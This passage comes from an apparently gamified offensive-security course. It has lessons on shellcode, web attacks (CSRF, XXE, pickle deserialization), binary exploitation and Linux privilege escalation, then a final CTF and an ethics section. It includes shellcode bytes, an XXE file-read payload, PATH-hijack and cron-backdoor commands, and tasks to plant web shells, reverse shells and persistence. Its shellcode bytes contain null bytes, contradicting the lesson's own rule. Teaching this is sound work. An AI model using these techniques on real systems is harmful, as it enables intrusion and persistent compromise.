- Format strings can leak sensitive data
- Writing memory allows complete control
- Modern compilers warn about this

**Common Misconceptions**:
- "Only printf is vulnerable" - sprintf, fprintf, etc. too
- "Format strings can't execute code" - Can overwrite function pointers
- "Hard to exploit" - Tools automate much of it
- "Rare vulnerability" - Still found in real software

**Challenge**: Exploit format string vulnerability (40min, 5 NIM, 40 XP)
- Leak stack values to find offset
- Read value at specific memory address
- Write to target address using %n
- Overwrite return address to redirect execution

**Rubric**:
- Offset found correctly (25%)
- Memory read successful (25%)
- Memory write works (25%)
- Return address overwritten (25%)

---

### 20. Shellcode Development (45min)
**Goal**: Write small assembly programs to execute in exploited processes

**Content**:
- What is shellcode? Machine code for exploitation
- Requirements: Position-independent, no null bytes
- Common payloads: Execute shell, reverse shell, bind shell
- Syscalls: Direct OS interaction (execve, socket, etc.)
- Tools: pwntools, msfvenom

**TL;DR**: Shellcode is carefully crafted machine code injected during exploitation.

**Examples**:
```nasm
; Simple execve("/bin/sh", NULL, NULL) shellcode
; Syscall number: rax = 59
; Arguments: rdi = filename, rsi = argv, rdx = envp

xor rsi, rsi        ; NULL argv
xor rdx, rdx        ; NULL envp
mov rax, 0x68732f6e69622f  ; "/bin/sh" in hex
push rax
mov rdi, rsp        ; rdi points to "/bin/sh"
mov rax, 59         ; execve syscall
syscall

; Assembled to bytes:
; \x48\x31\xf6\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05
```

```python
# Using pwntools
from pwn import *

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Include in payload
payload = shellcode + b'A' * (offset - len(shellcode))
```

**Practice Questions**:
1. Why avoid null bytes? (Hint: String functions stop at null)
2. What's position-independent code? (Hint: Works at any address)
3. What syscall executes programs? (Hint: execve)

**Key Points**:
- Shellcode must be carefully crafted for environment
- Different architectures need different shellcode
- NX prevents shellcode execution (need ROP or other bypass)
- Test shellcode in isolated environment

**Common Misconceptions**:
- "Shellcode is always for shells" - Can do anything
- "Must write assembly manually" - Tools generate it
- "Shellcode always works" - Must match architecture and constraints
- "Short shellcode is better" - Must be correct first

**Challenge**: Create and test shellcode (45min, 5 NIM, 40 XP)
- Write shellcode to open a shell
- Ensure no null bytes in shellcode
- Test shellcode in vulnerable program
- Create reverse shell shellcode

**Rubric**:
- Shell-opening shellcode works (25%)
- No null bytes present (25%)
- Successfully tested in program (25%)
- Reverse shell created (25%)

---

### 21. Advanced Cryptography (45min)
**Goal**: Understand modern cryptographic systems and their attacks

**Content**:
- AES: Symmetric encryption standard
- RSA: Asymmetric encryption, factoring problem
- TLS/SSL: Securing network communications
- Common attacks: Padding oracle, timing attacks, weak keys
- Cryptographic misuse: ECB mode, key reuse

**TL;DR**: Modern crypto is strong when used correctly; implementation flaws create vulnerabilities.

**Examples**:
```python
# AES encryption (proper use)
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

key = get_random_bytes(16)  # 128-bit key
cipher = AES.new(key, AES.MODE_GCM)  # Good mode
nonce = cipher.nonce
ciphertext, tag = cipher.encrypt_and_digest(plaintext)

# RSA key generation
from Cryptodome.PublicKey import RSA

key = RSA.generate(2048)  # 2048-bit key
public_key = key.publickey()

# Weak RSA example (for learning)
# If n = p * q and p,q are close, can factor easily
```

```bash
# TLS handshake examination
openssl s_client -connect example.com:443

# Generate certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem
```

**Practice Questions**:
1. What's wrong with ECB mode? (Hint: Same plaintext = same ciphertext)
2. Why is RSA slow? (Hint: Complex math operations)
3. What does TLS protect against? (Hint: Eavesdropping, tampering)

**Key Points**:
- Never implement crypto yourself
- Use established libraries correctly
- Key management is critical
- Random numbers must be truly random

**Common Misconceptions**:
- "AES can be broken" - Not with proper key size
- "RSA is obsolete" - Still widely used
- "Encryption solves all security problems" - Just one part
- "Strong encryption = slow" - Modern CPUs have hardware acceleration

**Challenge**: Cryptographic analysis and attacks (45min, 5 NIM, 40 XP)
- Identify ECB mode encryption
- Perform padding oracle attack
- Factor weak RSA key
- Analyze TLS certificate chain

**Rubric**:
- ECB identified correctly (25%)
- Padding oracle successful (25%)
- RSA key factored (25%)
- Certificate analysis complete (25%)

---

### 22. Web Application Security Deep Dive (45min)
**Goal**: Advanced web vulnerabilities and exploitation techniques

**Content**:
- CSRF: Cross-Site Request Forgery
- SSRF: Server-Side Request Forgery
- XXE: XML External Entity injection
- Deserialization vulnerabilities
- Authentication and session management flaws

**TL;DR**: Modern web apps have complex attack surfaces beyond basic injection.

**Examples**:
```html
<!-- CSRF attack -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<!-- Victim's browser makes authenticated request -->

<!-- SSRF example -->
POST /fetch-url
url=http://localhost:22/admin
<!-- Server accesses internal resources -->

<!-- XXE injection -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

```python
# Insecure deserialization (Python)
import pickle
user_data = request.cookies.get('session')
session = pickle.loads(base64.b64decode(user_data))
# Attacker can execute arbitrary code via pickle
```

**Practice Questions**:
1. How does CSRF differ from XSS? (Hint: Who initiates the action)
2. What makes SSRF dangerous? (Hint: Access to internal resources)
3. Why is deserialization risky? (Hint: Can execute code)

**Key Points**:
- Modern frameworks provide protections
- Complex apps have complex vulnerabilities
- Defense in depth: Multiple security layers
- Security must be designed in, not added later

**Common Misconceptions**:
- "HTTPS prevents CSRF" - No, requests are still authenticated
- "Firewalls block SSRF" - Attack comes from trusted server
- "JSON doesn't have XXE" - Correct, but may be converted to XML
- "Only PHP has deserialization issues" - All languages can be vulnerable

**Challenge**: Advanced web exploitation (45min, 5 NIM, 40 XP)
- Execute CSRF attack to change user data
- Use SSRF to access internal service
- Exploit XXE to read local files
- Demonstrate insecure deserialization

**Rubric**:
- CSRF successful (25%)
- SSRF accessed internal resource (25%)
- XXE read file (25%)
- Deserialization exploited (25%)

---

### 23. Binary Exploitation Techniques (45min)
**Goal**: Advanced techniques for exploiting compiled programs

**Content**:
- Heap exploitation: Use-after-free, double-free
- Integer overflows: Wrapping around max values
- Race conditions: TOCTOU (Time-of-check time-of-use)
- Bypassing ASLR: Information leaks, brute force
- Exploitation mitigation: Stack canaries, RELRO, PIE

**TL;DR**: Modern binaries have many protections; exploitation requires bypassing multiple defenses.

**Examples**:
```c
// Integer overflow
unsigned int len = user_input;
if (len < 1000) {  // Check passes
    char *buf = malloc(len + 10);  // But len+10 might wrap to small value!
    memcpy(buf, data, len);  // Buffer overflow
}

// Use-after-free
char *ptr = malloc(100);
free(ptr);
// ... later ...
strcpy(ptr, input);  // Writes to freed memory!

// Race condition
if (access("file", W_OK) == 0) {  // Check
    // Attacker replaces file here!
    fd = open("file", O_WRONLY);  // Use different file
}
```

**Practice Questions**:
1. What happens when unsigned int overflows? (Hint: Wraps to 0)
2. Why is use-after-free dangerous? (Hint: Memory may be reallocated)
3. How does ASLR protect binaries? (Hint: Randomizes addresses)

**Key Points**:
- Heap is more complex than stack
- Integer overflows often overlooked
- Race conditions are hard to reproduce
- Modern protections require info leaks to bypass

**Common Misconceptions**:
- "Heap exploits are too hard" - Harder but very impactful
- "Integer overflows are rare" - Common in size calculations
- "ASLR makes exploitation impossible" - Leaks bypass it
- "Canaries prevent all stack exploits" - Can leak or bypass

**Challenge**: Advanced binary exploitation (45min, 5 NIM, 40 XP)
- Trigger integer overflow vulnerability
- Exploit use-after-free condition
- Bypass stack canary protection
- Leak address to defeat ASLR

**Rubric**:
- Integer overflow triggered (25%)
- Use-after-free exploited (25%)
- Canary bypassed (25%)
- ASLR defeated (25%)

---

### 24. System Security & Privilege Escalation (45min)
**Goal**: Escalate privileges on compromised systems

**Content**:
- Linux privilege model: Users, groups, sudo
- Finding vulnerabilities: setuid binaries, world-writable files
- Kernel exploits: Local privilege escalation
- Misconfiguration: Sudo rules, cron jobs, PATH hijacking
- Enumeration tools: LinPEAS, LinEnum

**TL;DR**: Gaining initial access is step one; escalating to root is often step two.

**Examples**:
```bash
# Find setuid binaries
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# World-writable files
find / -writable -type f 2>/dev/null

# PATH hijacking
# If script runs: system("ls")
# Create malicious 'ls' in /tmp
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH

# Cron job exploitation
# If root runs: /scripts/backup.sh
# And backup.sh is writable...
echo '#!/bin/bash' > /scripts/backup.sh
echo 'cp /bin/bash /tmp/rootbash' >> /scripts/backup.sh
echo 'chmod +s /tmp/rootbash' >> /scripts/backup.sh
```

**Practice Questions**:
1. What does setuid do? (Hint: Run with owner's permissions)
2. Why check sudo -l? (Hint: Shows allowed commands)
3. How does PATH hijacking work? (Hint: Runs wrong binary)

**Key Points**:
- Enumeration is critical: Find the weak point
- Misconfiguration is more common than kernel exploits
- Persistence: Maintain access after reboot
- Cover tracks: Remove logs, hide backdoors

**Common Misconceptions**:
- "Need kernel exploit to get root" - Misconfiguration often enough
- "Setuid is always dangerous" - When misconfigured
- "Docker containers are secure" - Escape is possible
- "Privilege escalation is easy" - Depends on system hardening

**Challenge**: Privilege escalation exercise (45min, 5 NIM, 40 XP)
- Enumerate system for vulnerabilities
- Exploit setuid binary to gain root
- Use sudo misconfiguration to escalate
- Exploit cron job for persistence

**Rubric**:
- Enumeration complete (25%)
- Setuid exploit successful (25%)
- Sudo misconfiguration exploited (25%)
- Cron job backdoor established (25%)

---

### 25. Security Best Practices & Defense (45min)
**Goal**: Understand defensive security and secure coding practices

**Content**:
- Secure coding: Input validation, output encoding, least privilege
- Defense in depth: Multiple security layers
- Security testing: Fuzzing, static analysis, code review
- Incident response: Detection, containment, recovery
- Security mindset: Threat modeling, assume breach

**TL;DR**: Security is a continuous process requiring multiple defensive layers.

**Examples**:
```python
# Secure input validation
def process_user_input(user_input):
    # Whitelist approach
    if not re.match(r'^[a-zA-Z0-9_-]+$', user_input):
        raise ValueError("Invalid input")
    
    # Length limits
    if len(user_input) > 100:
        raise ValueError("Input too long")
    
    # Type checking
    if not isinstance(user_input, str):
        raise TypeError("Expected string")
    
    return user_input

# Prepared statement (prevents SQLi)
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# Proper password hashing
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Security headers
response.headers['X-Frame-Options'] = 'DENY'
response.headers['X-Content-Type-Options'] = 'nosniff'
response.headers['Content-Security-Policy'] = "default-src 'self'"
```

**Practice Questions**:
1. What's defense in depth? (Hint: Multiple security layers)
2. Why whitelist over blacklist? (Hint: Default deny)
3. What is threat modeling? (Hint: Identifying potential attacks)

**Key Points**:
- Prevention is cheaper than incident response
- Security requires ongoing effort
- People are often the weakest link
- Balance security with usability

**Common Misconceptions**:
- "Perfect security is achievable" - Only risk management is possible
- "Security slows development" - Fixing bugs later is slower
- "Only big companies need security" - Everyone is a target
- "Compliance equals security" - Compliance is minimum bar

**Challenge**: Security implementation project (45min, 5 NIM, 40 XP)
- Review code for security vulnerabilities
- Implement proper input validation
- Add security headers to web application
- Create incident response plan

**Rubric**:
- Vulnerabilities identified correctly (25%)
- Input validation implemented properly (25%)
- Security headers configured (25%)
- IR plan is comprehensive (25%)

---

## Final Assessment: Capture The Flag Challenge (120 minutes)

**Objective**: Complete a comprehensive CTF-style challenge incorporating all learned skills

**Challenge Components**:
1. **Reconnaissance** (20min)
   - Enumerate target system
   - Identify services and versions
   - Map attack surface

2. **Web Exploitation** (25min)
   - Find and exploit SQL injection
   - Bypass authentication
   - Upload web shell

3. **Binary Exploitation** (30min)
   - Analyze vulnerable binary
   - Craft buffer overflow exploit
   - Gain code execution

4. **Privilege Escalation** (25min)
   - Enumerate local system
   - Find privilege escalation vector
   - Obtain root access

5. **Post-Exploitation** (20min)
   - Establish persistence
   - Extract sensitive data
   - Document findings

**Submission Requirements**:
- Write-up documenting all steps (typed, not pasted)
- Screenshots of successful exploits
- Code for all exploits written
- Risk assessment and remediation recommendations

**Grading Rubric**:
- Reconnaissance complete (15%)
- Web exploitation successful (20%)
- Binary exploitation successful (25%)
- Privilege escalation achieved (20%)
- Post-exploitation documented (10%)
- Write-up quality (10%)

**Rewards**:
- **Pass (70%+)**: 12 NIM, 600 XP, Verified Cybersecurity Badge
- **Excellent (90%+)**: Additional 3 NIM bonus, "Elite Hacker" achievement

---

## Learning Resources

### Recommended Practice Platforms
- [pwn.college](https://pwn.college) - Comprehensive challenges (FREE)
- HackTheBox - Real-world scenarios
- TryHackMe - Guided learning paths
- OverTheWire - Linux and security basics
- PicoCTF - Beginner-friendly CTF

### Essential Tools
- **Analysis**: gdb, Ghidra, IDA Free, objdump, strings
- **Exploitation**: pwntools, metasploit, ROPgadget
- **Web**: Burp Suite, ZAP, curl, browser dev tools
- **Network**: Wireshark, tcpdump, nmap, netcat
- **Scripting**: Python, bash, various libraries

### Books & References
- "The Hacker Playbook" series - Practical techniques
- "The Web Application Hacker's Handbook" - Web security
- "Practical Binary Analysis" - Reverse engineering
- "Black Hat Python" - Python for security
- OWASP Top 10 - Critical web vulnerabilities

### Communities
- pwn.college Discord - Active learning community
- r/netsec, r/AskNetsec - Reddit communities
- InfoSec Twitter - Follow researchers
- CTF teams - Collaborative learning

---

## Ethical Guidelines

**You must follow these principles:**

1. **Only test systems you own or have written permission to test**
2. **Never cause damage to systems or data**
3. **Respect privacy and confidentiality**
4. **Disclose vulnerabilities responsibly**
5. **Use skills to improve security, not exploit others**

**Legal Considerations**:
- Unauthorized access is illegal (Computer Fraud and Abuse Act, CFAA)
- Permission must be explicit and documented
- Bug bounty programs provide legal testing opportunities
- Ethical hacking certifications (CEH, OSCP) require ethics agreement

**Remember**: The difference between a security professional and a criminal is authorization and intent.

---

## Career Paths

This curriculum prepares you for:
- **Penetration Tester** - Authorized hacking to find vulnerabilities
- **Security Analyst** - Monitor and respond to security incidents
- **Reverse Engineer** - Analyze malware and software
- **Application Security Engineer** - Build secure software
- **Bug Bounty Hunter** - Find vulnerabilities for rewards
- **Red Team Operator** - Simulate advanced adversaries
- **Security Researcher** - Discover new vulnerabilities

---

## Acknowledgments

This curriculum is inspired by the excellent work of:
- [pwn.college](https://pwn.college) - Arizona State University's open education platform
- The broader information security community
- Countless researchers who share knowledge freely

**Note**: This curriculum teaches concepts and techniques. While inspired by pwn.college's structure, all challenges are original to maintain pwn.college's request for no public writeups.

---

**Total**: 25 lessons | ~26 hours | 12 NIM + 600 XP
**Status**: Ready for implementation
**Last Updated**: 2026
